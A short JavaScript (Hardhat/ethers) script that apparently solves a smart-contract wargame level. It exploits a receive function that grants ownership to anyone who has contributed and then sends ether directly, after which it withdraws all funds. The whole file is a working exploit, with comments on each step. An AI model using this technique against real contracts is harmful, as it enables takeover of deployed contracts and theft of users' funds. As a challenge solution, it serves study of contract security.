const { BigNumber } = require("ethers");
const { ethers } = require("hardhat");

const INSTANCE = '0x8d2e67966560EE59B7FB21052DDC614F9c87F165'
const abi = [
    'function contribute() public payable', 
    'function withdraw() public', 
    'function owner() public view returns (address)'
]

async function hack(contract, signer) {
    // The receive function requires contributions[msg.sender] > 0, so we must contribute first.
    const tx1 = await contract.contribute({ value: BigNumber.from('100') })
    await tx1.wait();
    console.log('Contributed 100 Wei.')

    // The contract's receive function is triggered if Wei is received with no data, and changes ownership to msg.sender.
    const tx2 = await signer.sendTransaction({ to: contract.address, value: BigNumber.from('100') })
    await tx2.wait();
    console.log('Sent 100 Wei Directly.')

    const owner = await contract.owner()
    console.log(`Ownership Stolen. New Owner: ${owner}`);

    const tx3 = await contract.withdraw();
    console.log('Funds drained.')
}

const signer = ethers.getSigner().then(signer => {
    const contract = new ethers.Contract(INSTANCE, abi, signer);
    console.log('Contract Setup Completed.')
    hack(contract, signer)
})